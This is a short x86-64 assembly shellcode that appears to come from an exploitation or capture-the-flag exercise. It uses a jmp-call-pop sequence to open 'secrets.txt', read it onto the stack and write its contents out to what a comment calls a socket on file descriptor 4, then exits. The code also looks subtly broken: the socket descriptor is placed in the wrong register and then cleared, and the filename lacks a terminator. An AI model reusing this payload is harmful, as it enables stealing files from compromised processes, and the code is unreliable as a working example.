	.global _start

	.text

_start:
	jmp path

goback:
	# open(secrets.txt)
	xor	%rax, %rax
	addb	$2, %al
	#push	$path
	pop	%rdi
	xor	%rsi, %rsi
	syscall

	# read(secrets.txt)
	mov	%rax, %rdi
	sub	$0xfff, %sp
	lea	0x08(%rsp), %rsi
	xor	%rdx, %rdx
	addb	$0xff, %dl
	xor 	%rax, %rax
	syscall

	# write(secrets.txt)
	xor	%rax, %rax
	inc	%rax			# system call 1 is write
	addb	$4, %dl 		# file handle 4 is socket
	mov	%rsp, %rsi
        xor	%rdx, %rdx
	addb	$0xff, %dl		# number of bytes
        syscall

	# exit(0)
	xor	%rax, %rax
	addb	$60, %al
	xor	%rdi, %rdi
	syscall

path:
	call goback
	.ascii	"secrets.txt"
